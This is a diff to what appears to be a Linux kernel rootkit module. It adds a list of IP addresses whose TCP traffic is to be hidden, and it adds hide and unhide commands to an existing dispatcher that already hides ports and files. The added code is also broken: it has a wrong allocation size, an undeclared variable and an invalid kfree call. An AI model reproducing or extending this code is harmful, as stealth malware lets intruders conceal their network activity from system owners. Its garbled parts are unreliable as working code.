@@ -573,6 +573,81 @@ void unhide_udp6_port (const char *port)
 // ========== END UDP PORT LIST ==========
 
 
+
+
+// ========== TCP PACKETS LIST ==========
+
+struct hidden_packet {
+    char ip[16];
+    struct list_head list;
+};
+
+LIST_HEAD(hidden_tcp4_packets);
+
+int hide_tcp4_packet(const char *ip)
+{
+    struct hidden_packet *p = kmalloc(sizeof(struct file_entry), GFP_KERNEL);
+    //size_t name_len;
+
+    if (!p) {
+        return 0;
+    }
+
+    /*
+    name_len = strlen(name) + 1;
+
+    // sanity check as `name` could point to some garbage without null anywhere nearby
+    if (name_len -1 > NAME_MAX) {
+        kfree(f);
+        return 0;
+    }
+
+    f->name = kmalloc(name_len, GFP_KERNEL);
+    if (!f->name) {
+        kfree(f);
+        return 0;
+    }
+    */
+
+    strncpy(p->ip, ip, 16);
+
+    list_add(&p->list, &hidden_tcp4_packets);
+
+    return 1;
+}
+
+void unhide_tcp4_packet(const char *name)
+{
+    struct hidden_packet *p, *tmp;
+
+    list_for_each_entry_safe(p, tmp, &hidden_tcp4_packets, list) {
+        if (strcmp(p->ip, ip) == 0) {
+            list_del(&p->list);
+            kfree(p->ip);
+            kfree(p);
+            break;
+        }
+    }
+}
+
+/*
+void file_remove_all(void)
+{
+    struct file_entry *f, *tmp;
+
+    list_for_each_entry_safe(f, tmp, &file_list, list) {
+        list_del(&f->list);
+        kfree(f->name);
+        kfree(f);
+    }
+}
+*/
+
+// ========== END TCP PACKETS LIST ==========
+
+
+
+
 // ========== FILE LIST ==========
 
 
@@ -1296,7 +1371,17 @@ int execute_command(const char __user *str, size_t length)
     } else if (strcmp(str, CFG_UNHIDE_UDP6_PORT) == 0) {
         pr_info("Got unhide udp6 port command\n");
         str += sizeof(CFG_UNHIDE_UDP6_PORT);
-        unhide_udp6_port(str);	    
+        unhide_udp6_port(str);
+	    
+    } else if (strcmp(str, CFG_HIDE_TCP4_PACKET) == 0) {
+        pr_info("Got hide tcp4 packet command\n");
+        str += sizeof(CFG_HIDE_TCP4_PACKET);
+	hide_tcp4_packet(str);
+    } else if (strcmp(str, CFG_UNHIDE_TCP4_PACKET) == 0) {
+        pr_info("Got unhide tcp4 packet command\n");
+        str += sizeof(CFG_UNHIDE_TCP4_PACKET);
+        unhide_tcp4_packet(str);
+    
     } else if (strcmp(str, CFG_HIDE_FILE) == 0) {
         pr_info("Got hide file command\n");
         str += sizeof(CFG_HIDE_FILE);
